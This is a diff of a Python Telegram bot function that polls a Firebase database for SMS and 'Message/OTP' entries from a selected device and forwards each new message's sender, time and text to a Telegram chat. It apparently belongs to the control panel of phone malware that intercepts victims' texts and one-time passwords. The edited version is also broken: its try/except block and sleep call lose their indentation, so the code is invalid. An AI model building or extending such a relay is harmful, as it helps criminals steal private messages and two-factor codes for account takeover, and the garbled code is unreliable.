@@ -197,21 +197,50 @@ async def monitor_task(chat_id, context):
     
     while is_monitoring:
         try:
-            sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
-            if sms_data and isinstance(sms_data, dict):
-                keys = list(sms_data.keys())
-                if keys[-1] != last_sms_key:
-                    last_sms_key = keys[-1]
-                    await context.bot.send_message(chat_id=chat_id, text=f"📱 New SMS:\n{sms_data[last_sms_key]}")
-            
-            msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json()
-            if msg_data and isinstance(msg_data, dict):
-                keys = list(msg_data.keys())
-                if keys[-1] != last_msg_key:
-                    last_msg_key = keys[-1]
-                    await context.bot.send_message(chat_id=chat_id, text=f"📩 New Message/OTP:\n{msg_data[last_msg_key]}")
-        except: pass
-        await asyncio.sleep(5)
+    sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
+    if sms_data and isinstance(sms_data, dict):
+        keys = list(sms_data.keys())
+        if keys[-1] != last_sms_key:
+            last_sms_key = keys[-1]
+
+            sms = sms_data[last_sms_key]
+            sender = sms.get("sender", "Unknown")
+            time = sms.get("dateTime", "Unknown")
+            message = sms.get("message", "")
+
+            text = (
+                "📩 New Incoming SMS\n\n"
+                f"📱 From: {sender}\n"
+                f"🕒 Time: {time}\n\n"
+                f"💬 Message:\n{message}"
+            )
+
+            await context.bot.send_message(chat_id=chat_id, text=text)
+
+    msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json()
+    if msg_data and isinstance(msg_data, dict):
+        keys = list(msg_data.keys())
+        if keys[-1] != last_msg_key:
+            last_msg_key = keys[-1]
+
+            msg = msg_data[last_msg_key]
+            sender = msg.get("sender", "Unknown")
+            time = msg.get("dateTime", "Unknown")
+            message = msg.get("message", "")
+
+            text = (
+                "📩 New Incoming SMS\n\n"
+                f"📱 From: {sender}\n"
+                f"🕒 Time: {time}\n\n"
+                f"💬 Message:\n{message}"
+            )
+
+            await context.bot.send_message(chat_id=chat_id, text=text)
+
+except Exception as e:
+    print(e)
+
+await asyncio.sleep(5)
 
 async def start_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check(update): return
